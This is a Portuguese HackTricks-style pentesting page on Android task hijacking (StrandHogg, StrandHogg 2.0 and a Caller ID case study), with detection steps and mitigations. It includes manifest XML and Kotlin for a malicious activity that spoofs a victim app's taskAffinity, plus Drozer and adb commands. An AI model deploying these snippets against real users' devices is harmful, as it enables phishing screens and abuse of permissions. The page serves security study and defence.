# Android Task Hijacking

{{#include ../../banners/hacktricks-training.md}}

## Tarefas, Pilha de Atividades e Atividades em Primeiro Plano

No Android, uma **tarefa** é essencialmente um conjunto de atividades com as quais os usuários interagem para completar um trabalho específico, organizadas dentro de uma **pilha de atividades**. Esta pilha ordena as atividades com base em quando foram abertas, com a atividade mais recente exibida no topo como a **atividade em primeiro plano**. A qualquer momento, apenas esta atividade é visível na tela, tornando-a parte da **tarefa em primeiro plano**.

Aqui está um resumo rápido das transições de atividades:

- **Atividade 1** começa como a única atividade em primeiro plano.
- Lançar **Atividade 2** empurra **Atividade 1** para a pilha de atividades, trazendo **Atividade 2** para o primeiro plano.
- Iniciar **Atividade 3** move **Atividade 1** e **Atividade 2** mais para trás na pilha, com **Atividade 3** agora na frente.
- Fechar **Atividade 3** traz **Atividade 2** de volta ao primeiro plano, mostrando o mecanismo de navegação de tarefas simplificado do Android.

![https://developer.android.com/images/fundamentals/diagram_backstack.png](<../../images/image (698).png>)

---

## Ataques de afinidade de tarefa

`taskAffinity` informa ao Android a qual tarefa uma `Activity` *prefere* pertencer. Quando duas atividades compartilham a mesma afinidade, **o Android pode mesclá-las dentro da mesma pilha de atividades, mesmo que venham de diferentes APKs**.

Se um atacante conseguir colocar uma atividade maliciosa na **raiz** dessa pilha, toda vez que a vítima abrir o aplicativo legítimo, a interface maliciosa será a primeira coisa que o usuário verá – perfeito para phishing ou solicitações de permissões abusivas.

A superfície de ataque é mais ampla do que muitos desenvolvedores pensam, porque **cada atividade herda automaticamente uma afinidade igual ao nome do pacote do aplicativo** (a menos que o desenvolvedor defina `android:taskAffinity=""`). Portanto, *não fazer nada* já deixa o aplicativo vulnerável a sequestro de tarefas em versões do Android anteriores à 11.

### Cenário clássico "singleTask / StrandHogg"

1. O atacante declara uma atividade com:
```xml
<activity android:name=".EvilActivity"
android:exported="true"
android:taskAffinity="com.victim.package"
android:launchMode="singleTask" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
2. O aplicativo malicioso é iniciado uma vez para que a tarefa (com a afinidade falsificada) exista nas tarefas recentes.
3. Quando o usuário abre o aplicativo real mais tarde, o Android encontra uma tarefa cuja **afinidade raiz corresponde ao pacote** e simplesmente traz essa tarefa para o primeiro plano.
4. A interface do atacante é exibida primeiro.

### Variante Default–Affinity (sem `singleTask`) – Estudo de caso de Caller ID

A vulnerabilidade relatada no aplicativo **Caller ID (caller.id.phone.number.block)** mostra que o ataque *também* funciona contra o modo de lançamento `standard` padrão:

1. O aplicativo atacante cria uma atividade raiz falsa e imediatamente se oculta:
```kotlin
class HackActivity : AppCompatActivity() {
override fun onCreate(savedInstanceState: Bundle?) {
super.onCreate(savedInstanceState)
moveTaskToBack(true)   // mantém a tarefa nas recentes, mas fora de vista
}
}
```
2. O manifesto só precisa copiar o pacote da vítima em `taskAffinity`:
```xml
<activity android:name=".HackActivity"
android:exported="true"
android:taskAffinity="com.caller.id.phone.number.block" >
<intent-filter>
<action android:name="android.intent.action.MAIN"/>
<category android:name="android.intent.category.LAUNCHER"/>
</intent-filter>
</activity>
```
3. Assim que o usuário instala e abre o aplicativo malicioso **uma vez**, uma tarefa cuja afinidade é igual ao pacote da vítima existe (mas fica em segundo plano).
4. Quando o aplicativo real de Caller ID é lançado, o Android reutiliza essa tarefa e traz `HackActivity` para o primeiro plano → janela de phishing/abuso de permissões.

> NOTA: A partir do **Android 11 (API 30)**, o sistema *não* coloca dois pacotes que não fazem parte do mesmo UID na mesma tarefa por padrão, mitigando essa variante específica. Versões mais antigas permanecem vulneráveis.

---

### StrandHogg 2.0 (CVE-2020-0096) – Sequestro de tarefa baseado em reflexão

O boletim de segurança de maio de 2020 do Google corrigiu uma variante mais avançada chamada **StrandHogg 2.0**. O exploit **não depende de `taskAffinity` de forma alguma**; em vez disso, usa *reflexão* para inserir dinamicamente a atividade do atacante no topo de *todas* as tarefas em execução, contornando completamente a restrição de “UID compartilhado” introduzida pelo Android 11.

Pontos-chave:

* Um aplicativo malicioso sem permissões pode, uma vez aberto, iterar sobre tarefas em execução e chamar APIs ocultas para **reparentar** sua própria atividade em qualquer tarefa.
* Como a atividade é inserida após o tempo de execução, nem `launchMode` nem análise estática do manifesto podem detectar o ataque com antecedência.
* Corrigido por meio de um back-port de uma verificação no **Android 8.0/8.1/9** (SPL de maio de 2020). **Android 10 e versões posteriores não são afetados.**

A detecção em dispositivos pré-corrigidos pode ser realizada com `adb shell dumpsys activity activities` e observando atividades suspeitas cujo nome de pacote difere da *afinidade* da tarefa.

A mitigação para dispositivos legados é a mesma do sequestro de tarefas clássico **mais** verificação em tempo de execução (por exemplo, chamando [`ActivityManager#getRunningTasks`](https://developer.android.com/reference/android/app/ActivityManager#getRunningTasks(int)) e validando seu próprio nome de pacote).

---

## Lista de verificação de Detecção & Exploração

1. **Revisão estática** – Extraia `AndroidManifest.xml` do APK alvo e verifique se cada `<activity>` (ou o elemento global `<application>`) contém `android:taskAffinity=""` (vazio) **ou** um valor personalizado. Ferramentas como:
```bash
# Usando apkanalyzer (Android SDK)
apkanalyzer manifest print app.apk | grep -i taskaffinity

# Usando AXMLPrinter2
java -jar AXMLPrinter2.jar AndroidManifest.xml | grep taskAffinity
```
2. **Revisão dinâmica** – No dispositivo, abra o aplicativo alvo e liste as tarefas:
```bash
adb shell dumpsys activity activities | grep -A3 "TASK" | grep -E "Root|affinity"
```
Uma tarefa cuja afinidade raiz é igual ao pacote da vítima, mas cuja atividade superior pertence a um *pacote diferente* é um sinal de alerta.
3. Crie um aplicativo malicioso conforme descrito acima, ou use **[Drozer](https://github.com/WithSecureLabs/drozer)**:
```bash
drozer console connect
run app.activity.start --component com.victim/.MainActivity --action android.intent.action.MAIN
run app.activity.info com.victim
```

---

## Mitigação

Os desenvolvedores devem:

* Definir explicitamente `android:taskAffinity=""` no nível `<application>` (recomendado) **ou** dar a cada atividade uma afinidade única e privada.
* Para telas altamente sensíveis, combine o acima com `android:launchMode="singleInstance"` ou proteções modernas [`setLaunchMode`](https://developer.android.com/reference/android/content/pm/ActivityInfo#launchMode).
* Atualizar a `targetSdkVersion` do aplicativo e impor mudanças comportamentais do **Android 11**, onde as tarefas não são compartilhadas entre pacotes por padrão.
* Almejar **Android 12 (API 31) ou superior** para que o atributo obrigatório `android:exported` force os desenvolvedores a auditar cada componente acessível externamente.
* Considerar autodefesa em tempo de execução: consultar periodicamente `ActivityTaskManager` para garantir que o pacote da sua atividade superior corresponda ao seu.

---

## Técnicas relacionadas de UI-Hijacking

O sequestro de tarefas é frequentemente combinado ou substituído por **tapjacking** (decepção de UI baseada em sobreposição). A pesquisa de 2025 **TapTrap** mostrou que atividades *transparentes e impulsionadas por animação* podem contornar as restrições de toque de sobreposição introduzidas no Android 12–14 e ainda enganar os usuários para conceder permissões perigosas. Embora TapTrap não seja estritamente *sequestro* de tarefas, o objetivo final (cliques de phishing) é idêntico – portanto, avaliações modernas devem verificar ambas as superfícies de ataque.

---

## Referências

- [https://blog.dixitaditya.com/android-task-hijacking/](https://blog.dixitaditya.com/android-task-hijacking/)
- [https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html](https://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html)
- [Android Manifest Misconfiguration Leading to Task Hijacking in Caller ID app](https://github.com/KMov-g/androidapps/blob/main/caller.id.phone.number.block.md)
- [https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06](https://medium.com/mobile-app-development-publication/the-risk-of-android-strandhogg-security-issue-and-how-it-can-be-mitigated-80d2ddb4af06)
- [Promon – StrandHogg 2.0 (CVE-2020-0096) technical write-up](https://promon.io/resources/downloads/strandhogg-2-0-new-serious-android-vulnerability)
- [USENIX 2025 – TapTrap: Animation-Driven Tapjacking on Android](https://www.usenix.org/conference/usenixsecurity25/presentation/beer)

{{#include ../../banners/hacktricks-training.md}}
